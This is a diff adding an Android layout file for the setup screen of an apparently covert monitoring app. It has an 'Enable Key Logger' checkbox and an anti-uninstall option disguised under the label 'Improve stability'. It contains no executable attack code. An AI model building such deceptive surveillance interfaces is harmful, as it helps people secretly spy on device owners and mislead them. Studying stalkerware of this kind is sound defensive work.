@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="utf-8"?>
+<RelativeLayout android:layout_width="fill_parent" android:layout_height="fill_parent"
+  xmlns:android="http://schemas.android.com/apk/res/android">
+    <ScrollView android:background="#ffe5e5e5" android:layout_width="fill_parent" android:layout_height="fill_parent" android:layout_alignParentLeft="true" android:layout_alignParentTop="true" android:layout_alignParentStart="true">
+        <LinearLayout android:orientation="vertical" android:layout_width="fill_parent" android:layout_height="wrap_content">
+            <ImageView android:id="@id/imageView2" android:background="@drawable/header_bg" android:layout_width="fill_parent" android:layout_height="wrap_content" android:src="@drawable/header_logo" android:cropToPadding="true" />
+            <RelativeLayout android:focusable="true" android:focusableInTouchMode="true" android:layout_width="fill_parent" android:layout_height="fill_parent" android:layout_marginLeft="10.0dip" android:layout_marginTop="10.0dip" android:layout_marginRight="10.0dip">
+                <TextView android:textColor="@color/example" android:id="@id/labelWelcome" android:layout_width="fill_parent" android:layout_height="wrap_content" android:text="@string/label_registration" />
+                <TextView android:textColor="@color/example" android:id="@id/labelDescription" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="5.0dip" android:text="@string/text_welcome_main" android:layout_below="@id/labelWelcome" />
+                <LinearLayout android:orientation="horizontal" android:id="@id/ll1" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_below="@id/labelDescription">
+                    <TextView android:textColor="#ff0099cc" android:gravity="left|center" android:layout_gravity="left" android:id="@id/label_accept_tos" android:clickable="true" android:layout_width="wrap_content" android:layout_height="fill_parent" android:text="@string/label_accept_tos" android:onClick="openLegalActivity" />
+                    <LinearLayout android:gravity="right" android:orientation="horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                        <CheckBox android:id="@id/checkboxTos" android:layout_width="wrap_content" android:layout_height="wrap_content" android:onClick="acceptTos" android:scaleX="1.5" android:scaleY="1.5" />
+                    </LinearLayout>
+                </LinearLayout>
+                <View android:id="@id/s1" android:background="#ffc0c0c0" android:layout_width="fill_parent" android:layout_height="2.0dip" android:layout_below="@id/ll1" />
+                <LinearLayout android:orientation="horizontal" android:id="@id/ll2" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_below="@id/s1">
+                    <TextView android:textColor="@color/example" android:gravity="left|center" android:layout_gravity="left" android:id="@id/label_prevent_uninstallation" android:layout_width="wrap_content" android:layout_height="fill_parent" android:text="Improve stability" />
+                    <LinearLayout android:gravity="right" android:orientation="horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                        <CheckBox android:id="@id/checkboxPreventUninstallation" android:layout_width="wrap_content" android:layout_height="wrap_content" android:onClick="preventUninstallation" android:scaleX="1.5" android:scaleY="1.5" />
+                    </LinearLayout>
+                </LinearLayout>
+                <View android:id="@id/s2" android:background="#ffc0c0c0" android:layout_width="fill_parent" android:layout_height="2.0dip" android:layout_below="@id/ll2" />
+                <LinearLayout android:orientation="horizontal" android:id="@id/ll3" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_below="@id/s2">
+                    <TextView android:textColor="@color/example" android:gravity="left|center" android:layout_gravity="left" android:id="@id/label_enable_keylogger" android:layout_width="wrap_content" android:layout_height="fill_parent" android:text="Enable Key Logger" />
+                    <LinearLayout android:gravity="right" android:orientation="horizontal" android:layout_width="fill_parent" android:layout_height="wrap_content">
+                        <CheckBox android:id="@id/checkboxEnableKeylogger" android:layout_width="wrap_content" android:layout_height="wrap_content" android:onClick="enableKeyLogger" android:scaleX="1.5" android:scaleY="1.5" />
+                    </LinearLayout>
+                </LinearLayout>
+                <View android:id="@id/s3" android:background="#ffc0c0c0" android:layout_width="fill_parent" android:layout_height="2.0dip" android:layout_below="@id/ll3" />
+                <View android:id="@id/s4" android:background="#ffc0c0c0" android:layout_width="fill_parent" android:layout_height="2.0dip" android:layout_below="@id/ll3" />
+                <LinearLayout android:orientation="vertical" android:id="@id/ll5" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="10.0dip" android:layout_below="@id/s4">
+                    <EditText android:id="@id/emailFirst" android:layout_width="fill_parent" android:layout_height="wrap_content" android:hint="@string/enter_your_email" android:inputType="textEmailAddress" />
+                    <EditText android:id="@id/emailSecond" android:layout_width="fill_parent" android:layout_height="wrap_content" android:hint="@string/reenter_your_email" android:inputType="textEmailAddress" />
+                    <Button android:id="@id/buttonCompleteInstallation" android:layout_width="fill_parent" android:layout_height="wrap_content" android:layout_marginTop="10.0dip" android:text="@string/complete_installation" android:onClick="completeInstallationOnClick" />
+                    <TextView android:textColor="#ffa6a6a6" android:id="@id/labelImportant" android:layout_width="wrap_content" android:layout_height="fill_parent" android:text="@string/important" />
+                    <TextView android:textColor="#ffa6a6a6" android:id="@id/label_important_a" android:layout_width="wrap_content" android:layout_height="fill_parent" android:text="@string/enter_valid_email_address" />
+                    <TextView android:textColor="#ffa6a6a6" android:id="@id/label_important_b" android:layout_width="wrap_content" android:layout_height="fill_parent" android:text="@string/check_your_email_for_login_info" />
+                    <TextView android:textColor="#ffa6a6a6" android:id="@id/label_important_c" android:layout_width="wrap_content" android:layout_height="fill_parent" android:text="@string/to_start_monitoring_visit_pa" />
+                </LinearLayout>
+            </RelativeLayout>
+        </LinearLayout>
+    </ScrollView>
+</RelativeLayout>
